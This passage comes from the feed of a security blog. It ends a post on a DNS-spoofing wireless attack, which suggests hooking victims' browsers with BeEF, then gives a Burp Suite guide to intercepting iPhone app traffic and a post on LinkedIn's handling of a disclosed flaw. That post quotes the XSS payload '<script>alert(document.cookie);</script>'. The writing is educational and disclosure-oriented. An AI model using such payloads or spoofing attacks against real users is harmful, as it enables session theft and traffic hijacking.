<p>That&rsquo;s all there is to it! You can find the full source on <a href="https://github.com/jordan-wright/python-wireless-attacks/blob/master/dnspwn.py">Github</a>.</p>

<h3>Demo</h3>

<p>For the demo, I have the following HTML response available on the host 192.168.2.138:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;html&gt;
</span><span class='line'>&lt;head&gt;&lt;/head&gt;
</span><span class='line'>&lt;body&gt;
</span><span class='line'>  Owned.
</span><span class='line'>&lt;/body&gt;
</span><span class='line'>&lt;/html&gt;</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s worth noticing that we can have <em>any</em> HTML, Javascript, etc. we want. It would be trivial to hook the browser using the <a href="http://beefproject.com/">BeEF framework</a>, for example.</p>

<p>Here&rsquo;s a screenshot of it in action (I am using my iPhone as the victim):</p>

<p><a href="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png"/></a>
<a href="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/iphone.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/iphone_small.png"/></a></p>

<h3>Conclusion &amp; Future Improvements</h3>

<p>It&rsquo;s important to note that this attack will work just as well on other simple request/response protocols. For example, the original &ldquo;airpwn&rdquo; attack spoofed HTTP responses. There are also quite a few improvements we can make to this script. Here are a few:</p>

<ul>
<li>Match requests against regular expressions (for example, only replacing Javascript content)</li>
<li>Set options from arguments / Read configuration information from a file</li>
<li>Implement the attack for other protocols (ie HTTP).</li>
</ul>


<p>Enjoy!</p>

<p>Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How to Pentest iPhone Apps with Burp]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp/"/>
    <updated>2013-11-07T15:50:00-06:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/11/07/how-to-pentest-iphone-apps-with-burp</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/iphone_burp.png"/></p>

<h3>Introduction</h3>

<p>When looking at the functionality of mobile apps, it&rsquo;s clear that they aren&rsquo;t <em>that</em> different than web applications. They often just serve as a frontend for the data stored on a central backend server or database. As such, if developers aren&rsquo;t careful to protect these apps, many of the <a href="https://www.owasp.org/index.php/Top_10_2013">same vulnerabilities</a> we find in standard web applications (such as injection attacks on unvalidated input) can be exploited by attackers.</p>

<p>This post will show how to setup the iPhone to work with the popular <a href="http://portswigger.net/burp/download.html">Burp Suite</a> so that traffic from apps can be intercepted and tested for vulnerabilities.</p>

<!--more-->


<h3>Getting the CA Certificate from Burp</h3>

<p>First, open up Burp, select the &ldquo;Proxy&rdquo; tab, and select the &ldquo;Options&rdquo; sub-tab. Then, under &ldquo;Proxy-Listeners&rdquo;, highlight the interface and select &ldquo;Edit&rdquo;. Then, open the &ldquo;Certificate&rdquo; sub-tab, and make sure it is set to &ldquo;Generate CA-signed per-host certificate&rdquo;. Since we will install the CA certificate on our iPhone, any certificate signed by Burp will be trusted.</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/burp_screen.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/burp_screen.PNG"/></a>
<a href="http://jordan-wright.github.io/images/blog/iphone_burp/burp_settings.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/burp_settings.PNG"/></a></p>

<p>Next, open up a desktop browser and set the proxy settings to use Burp. In this example, I&rsquo;ll use Chrome. Change your settings so that the browser uses Burp as shown below (IP address and port may differ).</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/pc_proxy_settings.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/pc_proxy_settings.PNG"/></a></p>

<p>Then, go to a site using HTTPS (ie: <a href="https://www.google.com">google.com</a>. Once the page comes up, click the icon in the left side of the address bar, select the &ldquo;Certificate&rdquo; sub-tab, and make sure that the certificate is signed by &ldquo;PortSwigger CA&rdquo;.</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/export_cert.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/export_cert.png"/></a></p>

<p>Next, click &ldquo;Certificate Information&rdquo;, and select &ldquo;Certification Path&rdquo; in the window that appears.</p>

<p>Highlight the root <strong>PortSwigger CA certificate</strong> and click &ldquo;View Certificate&rdquo;. Then, open up the &ldquo;Details&rdquo; tab and click &ldquo;Copy to File&rdquo;. Follow the Certificate Export wizard, making sure to save the certificate in DER encoded binary X.509 (.CER) format.</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/copy_to_file.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/copy_to_file.PNG"/></a></p>

<p>Once the certificate has been exported, we need to get it onto the iPhone. You can email it to yourself and open it in the iPhone, but I just chose to start a simple Python web server so that I could browse to the certificate as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -m SimpleHTTPServer</span></code></pre></td></tr></table></div></figure>


<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/safari.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/safari.PNG"/></a></p>

<p>After opening the certificate link in Safari, the following screen will be presented asking you if you want to install the certificate. Click &ldquo;Install&rdquo;, enter your PIN, and you&rsquo;re all set!</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/install_cert.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/install_cert.png"/></a>
<a href="http://jordan-wright.github.io/images/blog/iphone_burp/trusted_cert.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/trusted_cert.PNG"/></a></p>

<h3>Setting the iPhone Proxy Settings</h3>

<p>The last thing you will want to do is to set your iPhone to use the Burp proxy. You can do this by going into your wireless network settings and selecting &ldquo;Manual&rdquo; under &ldquo;HTTP PROXY&rdquo;. Then, just fill in the details!</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/ios_proxy_settings.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/ios_proxy_settings.png"/></a></p>

<h3>Testing</h3>

<p>You can test to see if this works by navigating to Google in Safari. If you don&rsquo;t receive an error, and you can intercept the request in Burp, then you&rsquo;re all set!</p>

<p><a href="http://jordan-wright.github.io/images/blog/iphone_burp/success.PNG" target="_blank"><img src="http://jordan-wright.github.io/images/blog/iphone_burp/success.PNG"/></a></p>

<p>As always, let me know if you have any questions or comments below!</p>

<p>Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Linkedin's Response to My "Phishing with Intro" Post]]></title>
    <link href="http://jordan-wright.github.io/blog/2013/11/01/linkedins-response-to-my-phishing-with-intro-post/"/>
    <updated>2013-11-01T17:55:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2013/11/01/linkedins-response-to-my-phishing-with-intro-post</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/linkedin_gift.png"/></p>

<h3>The Initial Post</h3>

<p>I recently published a <a href="http://jordan-wright.github.io/blog/2013/10/26/phishing-with-linkedins-intro/">blog post</a> which showed a practical attack against Linkedin&rsquo;s Intro. The post reached the front page of <a href="http://news.ycombinator.com">Hacker News</a> (a full writeup of my experience with the &ldquo;Hacker News Effect&rdquo; will be posted soon for those interested), which caused the post to gain quite a bit of publicity and traction. Soon after, I was contacted by Linkedin&rsquo;s security team. This was their response.</p>

<!--more-->


<h3>Linkedin&rsquo;s Response</h3>

<p>I was initially contacted via email by David Cintz, a member of Linkedin&rsquo;s security team, wanting to talk with me about the post. While talking with him on the phone, he made it immediately clear that he didn&rsquo;t call to ask me to take down the post &ndash; &ldquo;Linkedin isn&rsquo;t that kind of company&rdquo;. Instead, he simply wanted to see if I would be willing to provide him with any additional information about the vulnerability so that they could provide the most effective fix as soon as possible.</p>

<p>We stayed in contact via phone and email throughout the day, and a hotfix (see the update at the top of the original post) was released in the early evening. I was asked to verify the fix to make sure that it adequately addressed the vulnerability I found. After verifying the fix, the member of the security team told me that he wanted to thank me for my help. He told me that, while they normally don&rsquo;t reward vulnerabilities disclosed without previously notifying them, he appreciated my help and wanted to send me a small token of thanks.</p>

<h3>I&rsquo;ve Got Mail!</h3>

<p>I received the following package today:</p>

<p><a href="http://jordan-wright.github.io/images/blog/phish_response/gift.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/phish_response/gift.png"/></a></p>

<p>Here are the contents:</p>

<ul>
<li>T-Shirt

<ul>
<li>Front: &ldquo;in&#8221;FORMANT</li>
<li>Back: &lt;script&gt;alert(document.cookie);&lt;/script&gt;</li>
<li>Side: security@in</li>
</ul>
</li>
<li>Hand-written letter from David</li>
<li>2 Linkedin stickers</li>
<li>Linkedin-branded &ldquo;2 in 1&rdquo; Tumbler</li>
</ul>


<h3>Conclusion</h3>

<p>While I still believe that the security risks of using Intro will always outweigh the benefits of using it, I do think Linkedin&rsquo;s security team handled the situation very well. They approached the problem quickly and professionally, while going above and beyond to show appreciation for my help. I&rsquo;m a fan of giving credit where it&rsquo;s due and, in this case, Linkedin&rsquo;s security team certainly earned it.</p>

<p>Thanks, Linkedin.</p>

<h3>Full Timeline</h3>

<ul>
<li><em>October 27, 2013</em> &ndash; Blog Post Published</li>
<li><em>October 28, 2013 9:53 AM PDT</em> &ndash; Contacted by Linkedin Security Team</li>
<li><em>October 28, 2013 approx. 2:40 PM PDT</em> &ndash; Hotfix released</li>
</ul>


<p>-Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
]]></content>
  </entry>
  
</feed>
